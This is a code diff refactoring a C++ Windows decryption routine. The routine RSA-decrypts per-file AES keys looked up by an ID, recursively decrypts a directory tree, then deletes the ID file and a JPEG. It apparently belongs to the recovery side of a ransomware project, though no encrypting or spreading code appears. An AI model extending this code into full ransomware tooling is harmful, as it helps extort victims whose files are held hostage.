@@ -15,11 +15,6 @@ Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor)
 	return status;
 }
 
-void DecryptKeyIV(PBYTE keyIV, PBYTE* keyIVBuff, RsaDecryptor rsaDecryptor)
-{
-	*keyIVBuff = rsaDecryptor.decrypt(keyIV);
-}
-
 Status getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
 {
 	Status status;
@@ -120,8 +115,6 @@ void decrypt_wrapper(string path, RsaDecryptor rsaDecryptor)
 	if (!do_decrypt(path)) return;
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	if (keyIV == nullptr) goto CLEAN;
-	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
-	if (keyIVBuff == nullptr) goto CLEAN;
 	iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if (iv == nullptr) goto CLEAN;
 	key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
@@ -141,8 +134,11 @@ void decrypt_wrapper(string path, RsaDecryptor rsaDecryptor)
 	ifile.read((char*)cipher, cipherSize);
 	ifile.close();
 	//TODO add status read
-	DecryptKeyIV(keyIV, &keyIVBuff, rsaDecryptor);
-
+	keyIVBuff = rsaDecryptor.decrypt(keyIV);
+	if(!keyIVBuff)
+	{
+		goto CLEAN;
+	}
 	memcpy(key, keyIVBuff, KEY_LEN);
 	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
 	DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
@@ -182,7 +178,7 @@ std::string hex_to_string(const std::string& input)
 	return output;
 }
 
-void iterate(const path& parent, RsaDecryptor rsaDecryptor) {
+static void iterate(const path& parent, RsaDecryptor rsaDecryptor) {
 	string path;
 	directory_iterator end_itr;
 
@@ -222,7 +218,7 @@ int decryption_main()
 	
 	
 	idFile.open(pathToID, std::ios::binary);
-	id = std::string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
+	id = string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
 	idFile.close();
 	id.erase(0, 1);
 	id = string_to_hex(id);
@@ -230,25 +226,16 @@ int decryption_main()
 	status = getPrivateParams(id, stringPrivateBlob);
 	if(!NT_SUCCESS(status))
 	{
-
 		return -1;
 	}
 
 	rsaDecryptor.init_Decryptor(stringPrivateBlob);
 
-	/*status = getFromServer(id, sMasterIV, sMasterKey);
-	if(!NT_SUCCESS(status))
-	{
-		return -1;
-	}*/
-
 	iterate(path, rsaDecryptor);
-
 
 	remove(pathToID);
 	string pathToImage = get_path_to_jpeg();
 	remove(pathToImage);
-	//HeapFree(cipher);
 
 	return 0;
 }
